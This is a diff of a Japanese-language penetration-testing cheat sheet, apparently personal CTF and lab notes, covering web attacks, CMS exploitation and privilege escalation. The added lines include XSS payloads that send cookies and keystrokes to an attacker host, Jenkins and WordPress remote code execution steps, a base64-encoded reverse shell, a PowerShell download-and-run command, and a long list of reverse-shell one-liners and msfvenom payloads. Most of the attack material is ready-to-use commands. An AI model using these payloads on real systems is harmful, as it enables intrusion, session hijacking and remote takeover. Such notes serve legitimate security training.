@@ -361,32 +361,6 @@ nikto -h <url> -Format txt -o <output filename>
 - -ssl...SSLを使用するサイトで使用
 - -maxtime=30s...指定された時間後にスキャンを停止
 
-### WPScan
-パッシブスキャン
-```
-wpscan --update
-wpscan --url <url> -e vp #脆弱なプラグイン特定
-wpscan --url <url> -e vt #脆弱なTheme特定
-wpscan --url <url> -e u #ユーザの列挙
-wpscan --url <url> -e u -t -vp --log <output filename>
-```
-アグレッシブスキャン
-```
-wpscan --url <url> -e vp --plugins-detection aggressive
-```
-- -url...対象のURL指定
-- -e u...usernameの列挙
-- -t...テーマを列挙
-- -vp...脆弱性のあるプラグインを列挙
-- --log...ファイル出力
-
-#### リスト型攻撃/パスワード推測攻撃
-```
-wpscan --url <url> -U <ユーザ名> -P <辞書ファイル> --password-attack <攻撃タイプ>
-#攻撃タイプ：wp-login,xmlrpc,xmlrpc-multicall
-```
-- --force...「but does not seem to be running WordPress」などが出た際に警告を無視して強制的に実行する
-
 ### BurpSuite
 ローカルプロキシツール。  
 通信の改ざんをするために使用。  
@@ -462,7 +436,28 @@ http://<Target IP>/<file>.php?file=http://<Attacker IP>/rs.php
 <iframe src="javascript:alert('XSS');"></iframe>
 <IMG SRC=j&#X41vascript:alert('XSS')>
 ```
+```
+# ソースコードが下記のような場合
+<script>
+    document.getElementsByClassName('name')[0].innerHTML='test';
+</script>
 
+# 攻撃コードは以下のようになる
+  「'」でフィールドを閉じて、「;」でコマンドを終了させる。 
+  「//」でコメントを作成。
+';alert('xss');//
+```
+
+```
+# セッションハイジャック
+<script>fetch('https://<Attacker IP>?cookie=' + btoa(document.cookie) );</script>
+
+# キーロガー
+<script>document.onkeypress = function(e) { fetch('https://<Attacker IP>?key=' + btoa(e.key) );}</script>
+
+# メールアドレスの変更によるパスワードリセット攻撃
+<script>user.changeEmail('attacker@hacker.thm');</script>
+```
 ### SQLインジェクション
 ・後ろのスペースを入れて使用
 ```
@@ -476,9 +471,8 @@ admin'/*
 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
 ```
 #### UNION injection
+[]
 #### SQLインジェクション→reverse shell
-
-
 SQLmap:
 ```
 sqlmap -u http://192.168.56.1/vuln.php?id=1
@@ -501,6 +495,21 @@ sqlmap -u http：//192.168.0.1/vuln.php?id=1 --user-agent "Mozilla / 5.0（X11; 
 ```
 
 ### SSRF(サーバサイドリクエストフォージェリ)
+悪意のあるユーザーがWebサーバに攻撃者が選択したリソースに対して追加または編集されたHTTPリクエストを行わせるのを可能にする脆弱性。  
+SSRFには2つのタイプがあり、1つ目はデータが攻撃者の画面に返される通常のSSRF。  
+2つ目は、SSRFが発生するが攻撃者の画面に情報が返されたないBlind SSRF。  
+SSRFの脆弱性が主に見つかる箇所としては、以下の4点が挙げられる。  
+```
+# アドレスバーのパラメータで完全なURLが使用されている場合
+例) https//website.com/form?server=http://server.website.thm/store
+# フォームの非表示フィールド
+例) <input type="hidden" name="server" value="http://server.website.com/store">
+# ホスト名などの部分的なURL
+例) https://website.com/form?server=api
+# URL内のパラメータでパスが使用されている場合
+例) http://website.com/form?dst=/forms/contact
+```
+
 
 ### SSTI(サーバサイドテンプレートインジェクション)
 ![](./image/2021-04-14-15-23-34.png)
@@ -510,24 +519,74 @@ sqlmap -u http：//192.168.0.1/vuln.php?id=1 --user-agent "Mozilla / 5.0（X11; 
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
 
-### CMS
+## CMS
 - CMSの特定後、ログインページについて調査
 - その後、まずはデフォルトパスワードを入力
 - 次にSQLインジェクションを試す
 - サーバ内で見つけたものなどを用いて、パスワード推測
 - 最終的にHydraなどでブルートフォース
 
-#### WordPress
+## WordPress
+### チェックするパス
+```
+# WordPressのバージョン確認
+/license.txt
+
+# ログインページ
+/wp-admin/login.php
+/wp-admin/wp-login.php
+/login.php
+/wp-login.php
+```
+### チェックするファイル
+```
+# データベースのパスワードあり
+wp-config.php
+```
+
+### WPScan
+パッシブスキャン
+```
+wpscan --update
+wpscan --url <url> -e vp #脆弱なプラグイン特定
+wpscan --url <url> -e vt #脆弱なTheme特定
+wpscan --url <url> -e u #ユーザの列挙
+wpscan --url <url> -e u t vp --log <output filename>
+```
+アグレッシブスキャン
+```
+wpscan --url <url> -e vp --plugins-detection aggressive
+```
+- -url...対象のURL指定
+- -e 
+  - u...usernameの列挙
+  - vt...脆弱なテーマを列挙
+  - vp...脆弱性のあるプラグインを列挙
+- --log...ファイル出力
+
+#### リスト型攻撃/パスワード推測攻撃
+```
+wpscan --url http://test.com/ --passwords /usr/share/wordlist/rockyou.txt
+```
+上記のコマンドにより、有効なWordPressユーザーを自動的に検出して指定したパスワードリストを使用してブルートフォースする。  
+wp-login.phpページと有効になっている場合XMLRPCインタフェースを介したブルートフォースをサポートしている。
+
+```
+wpscan --url http://test.com/ --usernames admin --passwords /usr/share/wordlist/rockyou.txt
+```
+上記のようにユーザー名を指定することも可能。
+
+#### Panel RCE
 ```
 ログイン後、
-1.[Appearance]→[Editor]→[404 Template(404.php)]を選択して編集
+1.[Appearance]→[Theme Editor]→[404 Template(404.php)]を選択して編集
 2.PentestMonkeyのphp-reverse-shellをコピーして上書き
 3.netcatでリバースシェルを待ち受け
 4.下記のようなアドレスにアクセス
   http://192.168.1.101/wordpress/wp-content/themes/twentyfifteen/404.php
 ```
 
-#### drupal
+### Drupal
 ```
 MySQLに接続するための認証情報が記述されている
 /var/www/html/sites/default/settings.php
@@ -549,7 +608,7 @@ $databases = array (
 );
 ```
 
-### phpMyAdmin
+## phpMyAdmin
 MySQLサーバをWebブラウザで管理するためのデータベース接続ツール。  
 SQL文を記述することなく、MySQLの操作が行える。  
 Wordpressのデータベースを管理できる場合、パスワードの変更などが可能。(MD5)
@@ -561,6 +620,40 @@ INTO OUTFILE '/var/www/phpMyAdmin/cmd.php'
 ```
 ```
 http://test.com/phpMyAdmin/cmd.php?cmd=ls
+```
+
+## Jenkins
+### 　既知のエクスプロイト
+pwn_jenkins:  
+https://github.com/gquere/pwn_jenkins
+### プロジェクトを作成してRCE
+1.[New Item]→[Freestyle project]を選択して[Enter an item name]に名前を入力する。(testなど)
+2.[Build]の中にあるタブからWindowsなら[Execute Windows batch command]、Linuxなら[Execute shell]を選択する。
+3.[Command]にreverse shellペイロードを書き込んで[Save]を押下する。
+　(bash -i >& /dev/tcp/10.0.0.1/8080 0>&1など)
+4.最後に[Build Now]を押下すると、ペイロードが発火する。
+### Grooby scriptを利用したRCE
+1./scriptに移動する。  
+2.Script Consoleに各OSに準じたスクリプトを書き込んで[Run]を押下する。  
+
+#### Linux
+```
+echo "bash -i >& /dev/tcp/10.9.252.239/1234 0>&1" | base64                                 130 ⨯
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjI1Mi4yMzkvMTIzNCAwPiYxCg==
+```
+```
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjI1Mi4yMzkvMTIzNCAwPiYxCg==}|{base64,-d}|{bash,-i}'.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println "out> $sout err> $serr"
+```
+
+#### Windows
+```
+scriptblock="iex (New-Object Net.WebClient).DownloadString('http://10.10.10.1:8000/payload')"
+echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
+cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
 ```
 
 ### Wappalyzer
@@ -884,12 +977,12 @@ grant all privileges on test_db.* to <username>@<host name> IDENTIFIED BY <passw
 
 # Exploitation
 ## Reverse Shell
-Bash:
+### Bash
 ```
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
-Python:  
+### Python
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
@@ -903,29 +996,29 @@ os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 ```
 
-Perl:
+### Perl
 ```
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-PHP:
+### PHP
 ```
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 <?php echo system($_REQUEST ["cmd"]); ?>
 ```
 
-Ruby:
+### Ruby
 ```
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
-Netcat:
+### Netcat
 ```
 nc -e /bin/sh 10.0.0.1 1234
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
 
-PowerShell:
+### PowerShell
 ```
 C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.
 11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
@@ -945,57 +1038,52 @@ lient.Close()"
 - --platform...プラットフォームの選択(windows，Linux)
 - -o...ファイルの出力
   
-Windows
+### Windows
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 –f exe > reverse.exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse.exe
-```
-
-Windows(meterpreter):
-```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
 ```
 
-Linux:
+### Linux
 ```
 msfvenom -p linux/x64/shell_reverse_tcp RHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
-```
-Linux(meterpreter):
-```
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
 ```
 
-PHP:
+### PHP
 ```
 msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Port Number> -f raw > reverse.php
 ```
 
-ASP:
+### ASP
 ```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f aspx > reverse.aspx
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f aspx > reverse.aspx
 ```
 
-JSP:
+### JSP
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.jsp
 ```
 
-WAR:
+### WAR
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f war > reverse.war
 ```
 
-Python:
+### Python
 ```
 msfvenom -p cmd/unix/reverse_python LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.py
 ```
 
-Bash:
+### Bash
 ```
 msfvenom -p cmd/unix/reverse_bash LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.sh
 ```
 
-Perl:
+### Perl
 ```
 msfvenom -p cmd/unix/reverse_perl LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.pl
 ```
@@ -1010,10 +1098,10 @@ run
 ```
 
 ### meterpreterコマンド
+[]
 ```
 #meterpreterで使用する有用なコマンドをここに書く
 ```
-
 
 ## HttpServer
 ・攻撃者マシンでのサーバ立ち上げ。
@@ -1832,6 +1920,11 @@ netstat -tulpn
 netstat -an(linux以外)
 ```
 
+### チェックディレクトリ
+```
+/opt
+```
+
 ### *.sh実行時に「bad interpreter: No such file or directory」が表示されたら
 改行コードをCRLFからLFに置換して実行できるかを確認する。
 ```
@@ -2321,13 +2414,20 @@ PSExec64.exe -i -u "nt authority\local service" C:\Windows\Temp\reverse.exe
 上記で得られたシェルでwhoami /privコマンドを使用すると下記のような結果を得られる。  
 この時、いずれかの権限を持っている場合にRouge Potatoのエクスプロイトが機能する。
 - SeImpersonatePrivilege
-- SeAssignPrimaryTokenPrivilege
+- SeAssignPrimaryTokenPrivilege　　
 ここまでの流れとして、先ほどのRogue Potatoと同じ条件となる。  
 
 最後にlocal serviceのreverse shellが返ってきているシェルでPrintSpooferエクスプロイトを実行して、SYTEM権限のシェルを取得する。
 ```
 PrintSpoofer.exe -c "C:\Windows\Temp\reverse.exe(reverse shellペイロードが配置されているパス)" -i
 ```
+もしくは、
+```
+PrintSpoofer.exe -i -c cmd.exe
+PrintSpoofer.exe -i -c powershell.exe
+```
+などにより権限昇格可能。
+
 PrintSpoofer:  
 https://github.com/itm4n/PrintSpoofer.git
 
